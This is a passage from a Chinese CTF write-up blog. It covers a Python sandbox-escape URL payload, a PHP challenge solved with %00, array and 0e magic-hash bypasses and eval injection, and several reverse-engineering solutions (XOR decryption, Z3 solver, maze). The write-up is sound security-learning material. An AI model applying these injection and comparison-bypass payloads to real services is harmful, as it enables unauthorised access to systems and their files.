调用函数进行格式化</span></span><br><span class="line">formatted_str = string_to_percent_c_format(test_str)</span><br><span class="line"><span class="comment"># 打印经过 URL 编码后的格式化字符串</span></span><br><span class="line"><span class="built_in">print</span>(urllib.parse.quote(formatted_str))</span><br></pre></td></tr></table></figure>

<p>下边是构造的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.200.58.4:1111/?evalme=%27%25c%25c%25c%25c%25c%27%25%2847%2C102%2C108%2C97%2C103%29</span><br></pre></td></tr></table></figure>



<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922172000338.png" alt="image-20240922172000338"></p>
<h3 id="收获-14"><a href="#收获-14" class="headerlink" title="收获"></a>收获</h3><p>考查python的沙箱逃逸，还行也是很有意思的一道题</p>
<h2 id="web4-FLAG"><a href="#web4-FLAG" class="headerlink" title="web4-FLAG"></a>web4-FLAG</h2><h3 id="步骤-15"><a href="#步骤-15" class="headerlink" title="步骤"></a>步骤</h3><p>登录先查看源码</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922164121037.png" alt="image-20240922164121037"></p>
<p>找到php文件进行访问</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922164135304.png" alt="image-20240922164135304"></p>
<p>提示Cookie</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922164201427.png" alt="image-20240922164201427"></p>
<p>找到另一个php</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922164241228.png" alt="image-20240922164241228"></p>
<p>url解码查看php文件</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922164523660.png" alt="image-20240922164523660"></p>
<p>接下来分析代码</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922164539449.png" alt="image-20240922164539449"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;X&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$temp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;X&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$temp</span>)? <span class="keyword">die</span>(<span class="string">&quot;no numeric&quot;</span>) : <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$temp</span> &gt; <span class="number">9999</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Pupil.&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO!NO!NO!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Where is X?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>X非数字且大于9999，这里可以采用%00截断，也可以采用数组绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Y&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Y&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$md5</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Junior school student.&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO!NO!NO!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Where is Y?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Y进行若比较，直接采用0e字符串绕过即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Z&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Z&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No long!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>, <span class="string">&#x27;\&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span>. <span class="variable">$blackitem</span>. <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO!NO!NO!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$security</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;f1ag&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$security</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO!NO!NO!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f1ag</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$f1ag</span> == <span class="string">&quot;flag&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Senior high school student.&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Here_is_flag!!!!!!!&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;NO!NO!NO!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NO!NO!NO!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Where is Z?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>z直接传值小于60，再传个flag变量即可</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922164629404.png" alt="image-20240922164629404"></p>
<h3 id="收获-15"><a href="#收获-15" class="headerlink" title="收获"></a>收获</h3><p>正常操作，查看源码，解码，接下来是代码分析</p>
<p>代码分析里边存在混淆项，让一些人知难而退，实际就那样。</p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="re1-ez-apk"><a href="#re1-ez-apk" class="headerlink" title="re1-ez_apk"></a>re1-ez_apk</h2><h3 id="步骤-16"><a href="#步骤-16" class="headerlink" title="步骤"></a>步骤</h3><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929165304889.png" alt="image-20240929165304889"></p>
<p>给了一个apk，看样子是安卓逆向的题</p>
<p>拖进IDA分析</p>
<p>找到main函数接着分析加密逻辑</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929171158104.png" alt="image-20240929171158104"></p>
<p>看的出来是先遍历输入字符数组，判断字符合法性后对小写字母进行特定加密计算，最后与 cipher 比较返回是否匹配</p>
<p>然后就是去找密文与秘钥</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929171138195.png" alt="image-20240929171138195"></p>
<p>首先将字符串转换为字节数组，然后遍历字节数组，对每个字节与对应的索引值进行异或操作，最后将处理后的字节数组解码为字符串并返回。</p>
<p>接着构造第一段EXP对输入字符串进行解密：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_decrypt</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    此函数用于对输入字符串进行解密操作。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    bytes_array = <span class="built_in">bytearray</span>(string, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> index, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(bytes_array):</span><br><span class="line">        bytes_array[index] = byte ^ index</span><br><span class="line">    <span class="keyword">return</span> bytes_array.decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 与 R.string.cipher 相对应</span></span><br><span class="line">cipher_string = <span class="string">&quot;f`vgvkXknxfznQv|gz|&#125;c|G~bh&#123;&#123;x|VVFGX&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 还原加密逻辑</span></span><br><span class="line">result = encrypt_decrypt(cipher_string)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Processed String:&quot;</span>, result)</span><br></pre></td></tr></table></figure>



<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929165955793.png" alt="image-20240929165955793"></p>
<p> 对于输入字符串中的每个字符，如果是下划线、花括号等特殊字符则直接保留；如果是小写字母，则根据密钥进行解密操作；对于其他不能处理的字符，可选择中断操作。</p>
<p>构造第二段EXP用于根据给定的密钥对输入字符串进行解密操作：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_cin</span>(<span class="params">s, key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    此函数用于根据给定的密钥对输入字符串进行解密操作。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    bytes_key = key.encode()</span><br><span class="line">    decrypted_result = []</span><br><span class="line">    <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(s):</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> [<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>]:</span><br><span class="line">            decrypted_result.append(char)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;a&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            key_char = bytes_key[index % <span class="built_in">len</span>(bytes_key)]</span><br><span class="line">            decrypted_char = <span class="built_in">chr</span>(((<span class="built_in">ord</span>(char) - <span class="number">97</span> - (key_char - <span class="number">97</span>)) % <span class="number">26</span>) + <span class="number">97</span>)</span><br><span class="line">            decrypted_result.append(decrypted_char)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted_result)</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;aptxcony&quot;</span></span><br><span class="line">cipher_text = <span class="string">&quot;fatd&#123;sm_cgrmvc_ylvhokhuk_gxsgffc_wtec&#125;&quot;</span></span><br><span class="line">result = check_cin(cipher_text, key)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>



<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929170347326.png" alt="image-20240929170347326"></p>
<p>经过两次解密后即可获得flag</p>
<h3 id="收获-16"><a href="#收获-16" class="headerlink" title="收获"></a>收获</h3><p>主要是考察分析代码逻辑的哪里，通过这道安卓逆向我了解到了一种基于特定密钥对字符串进行加密和解密的方法，提升了对字符处理和加密算法的理解。</p>
<h2 id="re2-机器猫"><a href="#re2-机器猫" class="headerlink" title="re2-机器猫"></a>re2-机器猫</h2><h3 id="步骤-17"><a href="#步骤-17" class="headerlink" title="步骤"></a>步骤</h3><p>给了一个EXE文件，但打不开</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929115452847.png" alt="image-20240929115452847"></p>
<p>看来只能进行反编译查看python源码了</p>
<p>反编译exe文件</p>
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929111513708.png" alt="image-20240929111513708" style="zoom: 67%;" />

<p>获得pyc文件</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929111645192.png" alt="image-20240929111645192"></p>
<p>先查看主函数2.pyc里面有什么</p>
<p>将pyc反编译为python源码</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929112419460.png" alt="image-20240929112419460"></p>
<p>一大串代码，最后看到一段编码</p>
<p>很明显，base64加密</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929112705132.png" alt="image-20240929112705132"></p>
<p>没办法，解码结果看不懂，只能用ciphey进行尝试了</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929113113140.png" alt="image-20240929113113140"></p>
<p>不断尝试，获得正确flag</p>
<h3 id="收获-17"><a href="#收获-17" class="headerlink" title="收获"></a>收获</h3><p>给出的exe通常为python打包的可执行文件，反汇编查看源码分析即可，不过这题还掺杂了解密过程，确实有点意思</p>
<h2 id="re3-文件分析"><a href="#re3-文件分析" class="headerlink" title="re3-文件分析"></a>re3-文件分析</h2><h3 id="步骤-18"><a href="#步骤-18" class="headerlink" title="步骤"></a>步骤</h3><p>给了两个文件</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929123426461.png" alt="image-20240929123426461"></p>
<p>第二个应该c代码，txt查看</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929123310405.png" alt="image-20240929123310405"></p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929123255677.png" alt="image-20240929123255677"></p>
<p>看起来是一个密码校验程序。要求输入一个长度为 13 的字符串作为密码，然后通过一系列复杂的条件进行校验，全部符合就给flag。</p>
<p>对于复杂的密码校验问题，这种包含多个变量和复杂约束条件的情况，只能用Z3求解器了</p>
<p>根据约束条件上exp：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义密码长度</span></span><br><span class="line">len_pwd = <span class="number">12</span></span><br><span class="line"><span class="comment"># 创建密码数组，用整数表示每个密码字符</span></span><br><span class="line">pwd_arr = [Int(<span class="string">f&#x27;c<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_pwd)]</span><br><span class="line"><span class="comment"># 创建求解器对象</span></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为每个密码字符添加取值范围约束，确保在 0 到 255 之间</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> pwd_arr:</span><br><span class="line">    s.add(item &gt;= <span class="number">0</span>, item &lt;= <span class="number">255</span>)</span><br><span class="line">    </span><br><span class="line">cons = [</span><br><span class="line">    pwd_arr[<span class="number">0</span>] + pwd_arr[<span class="number">1</span>] == <span class="number">101</span>,</span><br><span class="line">    pwd_arr[<span class="number">1</span>] + pwd_arr[<span class="number">2</span>] == <span class="number">143</span>,</span><br><span class="line">    pwd_arr[<span class="number">0</span>] * pwd_arr[<span class="number">2</span>] == <span class="number">5035</span>,</span><br><span class="line">    pwd_arr[<span class="number">3</span>] + pwd_arr[<span class="number">5</span>] == <span class="number">163</span>,</span><br><span class="line">    pwd_arr[<span class="number">3</span>] + pwd_arr[<span class="number">4</span>] == <span class="number">226</span>,</span><br><span class="line">    pwd_arr[<span class="number">4</span>] * pwd_arr[<span class="number">5</span>] == <span class="number">5814</span>,</span><br><span class="line">    pwd_arr[<span class="number">7</span>] + pwd_arr[<span class="number">8</span>] == <span class="number">205</span>,</span><br><span class="line">    pwd_arr[<span class="number">6</span>] + pwd_arr[<span class="number">8</span>] == <span class="number">173</span>,</span><br><span class="line">    pwd_arr[<span class="number">6</span>] * pwd_arr[<span class="number">7</span>] == <span class="number">9744</span>,</span><br><span class="line">    pwd_arr[<span class="number">9</span>] + pwd_arr[<span class="number">10</span>] * pwd_arr[<span class="number">11</span>] == <span class="number">5375</span>,</span><br><span class="line">    pwd_arr[<span class="number">10</span>] + pwd_arr[<span class="number">9</span>] * pwd_arr[<span class="number">11</span>] == <span class="number">4670</span>,</span><br><span class="line">    pwd_arr[<span class="number">9</span>] + pwd_arr[<span class="number">10</span>] == <span class="number">205</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将所有约束添加到求解器中</span></span><br><span class="line">s.add(cons)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查求解器的可满足性</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="comment"># 获取满足约束的模型</span></span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="comment"># 将密码模型中的整数转换为字符并连接成字符串</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(m[item].as_long()) <span class="keyword">for</span> item <span class="keyword">in</span> pwd_arr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Password:&quot;</span>, res)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No found&quot;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="收获-18"><a href="#收获-18" class="headerlink" title="收获"></a>收获</h3><p>通过使用 Z3 求解器解决密码校验问题，使我深入了解了强大的约束求解工具。</p>
<h2 id="re4-CSMazeee"><a href="#re4-CSMazeee" class="headerlink" title="re4-CSMazeee"></a>re4-CSMazeee</h2><h3 id="步骤-19"><a href="#步骤-19" class="headerlink" title="步骤"></a>步骤</h3><p>首先查壳</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929182107355.png" alt="image-20240929182107355"></p>
<p>对于有 Net 壳的程序，暂不考虑去壳，直接拖到 IDA 中进行分析</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929183727110.png" alt="image-20240929183727110"></p>
<p>没办法，看不了，只能反汇编查看并去壳了</p>
<p>看看主函数</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929185020506.png" alt="image-20240929185020506"></p>
<p>多半是迷宫问题，应该去找创建迷宫的逻辑规律</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929190127735.png" alt="image-20240929190127735"></p>
<ul>
<li><code>r</code> 代表向右移动</li>
<li><code>d</code> 代表向下移动</li>
<li><code>u</code> 代表向上移动</li>
<li><code>l</code> 代表向左移动</li>
</ul>
<p>接下来就是通过动调找地图</p>
<p>控制移动得到字符串：rdrrrrrddrruuurrrdddddllllllluull</p>
<p>以及地图：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00******0000</span><br><span class="line"> *000000*0**0</span><br><span class="line"> ******0*0**0</span><br><span class="line"> **100*000**0</span><br><span class="line"> ****0******0</span><br><span class="line"> ****00000000</span><br></pre></td></tr></table></figure>

<p>很关键的部分：</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929190624136.png" alt="image-20240929190624136"></p>
<p>这里就太细了，点一百下太太太太容易被忽略了</p>
<p>综上，“u”“d”“r”“l” 分别控制着前后左右的移动方向，通过持续进行一百次的动态调试地图操作，便能获取到 flag</p>
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929191119474.png" alt="image-20240929191119474" style="zoom:67%;" />



<h3 id="收获-19"><a href="#收获-19" class="headerlink" title="收获"></a>收获</h3><p>考察点相当多，还考查细心程度，写出来真是太疯狂了</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
             <a href="/tags/%E5%90%84%E6%96%B9%E5%90%91/" <i class="fa fa-tag"></i> 各方向</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/10/27/%E5%B0%81%E7%A5%9E%E5%8F%B0-MiscWP/" rel="prev" title="封神台-MiscWP">
      <i class="fa fa-chevron-left"></i> 封神台-MiscWP
    </a></div>
      <div class="post-nav-item">
    <a href="/2024/10/28/BaseCTF2024/" rel="next" title="BaseCTF2024">
      BaseCTF2024 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">1.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#misc1-%E9%80%9A%E7%9F%A5"><span class="nav-number">1.1.</span> <span class="nav-text">misc1-通知</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.1.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7"><span class="nav-number">1.1.2.</span> <span class="nav-text">收获</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc2-%E7%BC%96%E7%A0%81"><span class="nav-number">1.2.</span> <span class="nav-text">misc2-编码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">收获</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc3-%E8%93%9D%E7%89%99"><span class="nav-number">1.3.</span> <span class="nav-text">misc3-蓝牙</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">收获</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc4-base"><span class="nav-number">1.4.</span> <span class="nav-text">misc4-base</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-3"><span class="nav-number">1.4.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7-3"><span class="nav-number">1.4.2.</span> <span class="nav-text">收获</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">2.</span> <span class="nav-text">PWN</span></a><ol 